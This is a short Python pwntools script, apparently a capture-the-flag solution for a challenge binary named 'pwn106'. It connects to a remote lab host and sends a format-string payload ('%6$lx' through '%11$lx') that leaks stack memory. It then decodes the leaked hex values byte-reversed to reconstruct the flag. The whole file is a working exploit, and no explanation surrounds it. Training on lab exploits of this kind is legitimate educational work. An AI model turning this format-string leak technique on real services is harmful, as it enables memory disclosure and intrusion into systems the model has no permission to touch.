from pwn import *

# Set up the process to interact with
process_name = './pwn106'
#p = process(process_name)
p = remote('10.10.171.197', 9006)

payload = "%6$lx.%7$lx.%8$lx.%9$lx.%10$lx.%11$lx" 

p.sendline(payload)
#output = p.recvall().decode()
p.recvuntil('Thanks ')
output = p.recvline().decode()
hex_values = output.strip().split('.')
flag = ""
for h in hex_values:
    flag += bytes.fromhex(h).decode('utf-8')[::-1]

print(flag)

p.close()
